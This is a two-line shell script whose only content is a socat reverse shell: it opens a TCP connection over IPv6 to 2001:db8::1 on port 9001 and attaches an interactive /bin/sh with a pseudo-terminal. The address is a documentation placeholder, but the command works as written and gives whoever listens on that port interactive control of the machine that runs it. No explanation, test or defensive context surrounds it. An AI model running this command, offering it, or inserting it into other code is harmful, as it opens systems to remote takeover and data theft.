#!/bin/sh
socat EXEC:'/bin/sh -i',pty TCP6-CONNECT:[2001:db8::1]:9001
